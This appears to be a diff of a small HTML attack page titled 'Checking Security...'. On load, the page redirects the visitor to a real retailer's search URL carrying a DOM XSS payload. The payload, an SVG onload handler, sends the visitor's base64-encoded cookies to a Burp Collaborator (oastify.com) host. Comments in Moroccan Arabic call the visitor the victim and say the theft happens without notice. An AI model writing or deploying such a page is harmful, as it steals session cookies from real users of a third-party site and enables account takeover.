@@ -1,19 +1,19 @@
 <!DOCTYPE html>
 <html>
-<body onload="launchAttack()">
+<head>
+    <title>Checking Security...</title>
+</head>
+<body onload="autoAttack()">
     <script>
-        function launchAttack() {
-            // الرابط ديالك فـ Burp Collaborator
-            var collab = "187m5vfen9olxmjps0kpiw4o2f86w8kx.oastify.com";
+        function autoAttack() {
+            // هادا هو الكود اللي كنتي باغي تكتبو فـ الكونسول
+            var myCode = "fetch('https://sb7d8mi5q0rc0dmgvrngln7f56bxz0np.oastify.com/?exfil=' + btoa(document.cookie), {mode:'no-cors'}); alert('Testing Collaborator - Data Sent!');";
 
-            // الكود اللي غايتنفذ وسط الـ SVG
-            // كيهز الكوكيز ويصيفطهم لـ Burp بلا ما يعيق الحد
-            var payload = "fetch('https://" + collab + "/?exfil=' + btoa(document.cookie))";
+            // هادا هو الرابط ديال Decathlon اللي فيه الثغرة (DOM XSS)
+            // غادي نحقنو فيه الكود ديالك
+            var targetUrl = "https://www.decathlon.com/search?q=test#<svg/onload=\"" + myCode + "\">";
 
-            // الرابط اللي عطيتيني مع الـ Payload المطور
-            var targetUrl = "https://www.decathlon.com/search?q=test#<svg/onload=\"" + payload + "\">";
-
-            // توجيه الضحية أوتوماتيكياً
+            // التوجيه التلقائي
             window.location.href = targetUrl;
         }
     </script>
